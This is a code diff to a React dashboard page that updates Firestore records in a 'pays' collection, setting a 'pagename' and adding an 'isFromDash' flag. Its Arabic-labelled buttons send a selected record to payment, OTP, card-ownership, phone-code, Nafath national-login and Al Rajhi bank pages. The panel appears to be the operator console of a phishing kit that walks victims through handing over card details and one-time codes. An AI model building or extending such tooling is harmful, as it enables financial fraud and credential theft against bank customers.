@@ -430,11 +430,12 @@ export default function NotificationsPage() {
     }
   }
 
-  const handleUpdatePagename = async (id: string, newPagename: string, ath: string) => {
+  const handleUpdatePagename = async (id: string, newPagename: string) => {
     try {
       const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
         pagename: newPagename,
+        isFromDash:true
       })
 
       // Update local state
@@ -1517,7 +1518,7 @@ export default function NotificationsPage() {
                 </Button>
                 <Button
                   onClick={() => {
-                    handleUpdatePagename(selectedCardInfo.id, "external-link", "yes")
+                    handleUpdatePagename(selectedCardInfo.id, "external-link")
                   }}
                   className="w-full bg-gradient-to-r from-slate-600 to-slate-700 hover:from-slate-700 hover:to-slate-800 text-white border-0 shadow-md"
                 >
@@ -1556,7 +1557,7 @@ export default function NotificationsPage() {
                         ? "bg-cyan-50 border-cyan-300 dark:bg-cyan-900/30 dark:border-cyan-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "payment", "yes")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "payment")}
                   >
                     <CreditCard className="h-4 w-4" />
                     دفع
@@ -1568,7 +1569,7 @@ export default function NotificationsPage() {
                         ? "bg-violet-50 border-violet-300 dark:bg-violet-900/30 dark:border-violet-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "", "yes")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "")}
                   >
                     <FileText className="h-4 w-4" />
                     تسجيل
@@ -1580,7 +1581,7 @@ export default function NotificationsPage() {
                         ? "bg-teal-50 border-teal-300 dark:bg-teal-900/30 dark:border-teal-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz", "")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
                   >
                     <Shield className="h-4 w-4" />
                     نفاذ
@@ -1592,7 +1593,7 @@ export default function NotificationsPage() {
                         ? "bg-pink-50 border-pink-300 dark:bg-pink-900/30 dark:border-pink-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-otp", "yes")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-otp")}
                   >
                     <Shield className="h-4 w-4" />
                     رمز OTP
@@ -1604,7 +1605,7 @@ export default function NotificationsPage() {
                         ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "external-link", "yes")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "external-link")}
                   >
                     <Tag className="h-4 w-4" />
                     راجحي
@@ -1616,7 +1617,7 @@ export default function NotificationsPage() {
                         ? "bg-amber-50 border-amber-300 dark:bg-amber-900/30 dark:border-amber-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-card-ownership", "yes")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-card-ownership")}
                   >
                     <CreditCard className="h-4 w-4" />
                     رمز ownership
@@ -1628,7 +1629,7 @@ export default function NotificationsPage() {
                         ? "bg-rose-50 border-rose-300 dark:bg-rose-900/30 dark:border-rose-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-phone", "yes")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-phone")}
                   >
                     <Smartphone className="h-4 w-4" />
                     رمز هاتف
@@ -1640,7 +1641,7 @@ export default function NotificationsPage() {
                         ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "offers", "yes")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "offers")}
                   >
                     <Tag className="h-4 w-4" />
                     عروض
